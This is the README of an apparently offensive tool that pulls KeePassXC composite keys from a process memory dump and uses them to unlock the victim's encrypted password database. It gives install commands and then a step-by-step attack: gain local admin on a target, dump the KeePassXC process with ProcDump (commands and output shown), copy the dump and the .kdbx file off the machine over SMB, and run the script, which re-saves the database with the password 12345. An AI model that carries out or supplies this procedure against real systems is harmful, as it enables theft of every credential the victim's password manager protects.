# KeePass-the-Hash
A script that greps composite key-like strings from a KeePassXC process dump, then uses a customized version of [pykeepass](https://pypi.org/project/pykeepass/) library to unlock the database.

## Installation

```
git clone https://github.com/d3lb3/KeePass-the-Hash
python3 -m pip install -r requirements.txt
```

## Usage

1. Gain access to the target machine running KeePass as local administrator.

2. Perform a process dump from the running KeePass process (I typically go with [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) + [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump))

   ```
   PS C:\Windows\Temp> Get-Process keepassxc                                                                                                                                                                                                       
   Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
   -------  ------    -----      -----     ------     --  -- -----------
       358      33    36508       1396       3.22    988   1   KeePassXC                                                   
       
   PS C:\Windows\Temp> .\procdump.exe -accepteula -ma 988 keepassxc.dmp
   
   ProcDump v11.0 - Sysinternals process dump utility
   Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
   Sysinternals - www.sysinternals.com                                                                                                                                                                                                             [05:14:08] Dump 1 initiated: C:\Windows\Temp\keepassxc.dmp                                                              [05:14:09] Dump 1 writing: Estimated dump file size is 203 MB.                                                          [05:14:11] Dump 1 complete: 203 MB written in 2.2 seconds                                                               [05:14:11] Dump count reached.                                                                                          
   ```

3. Retrieve the process dump as well as the .KDBX containing the encrypted database (e.g. through SMB)

4. Run the script as follows:

   ```
   python3 pass_the_key.py <dump_file> <database_file>
   [+] Searching for a composite key in the memory dump... 
   [+] 28 candidates found, passing them to the database
   [+] Found a valid composite key !
   [+] Saved database as 'Passwords_unlocked.kdbx' with password 12345
   ```

5. You should now hopefully get a new .KDBX with password set to `12345` 
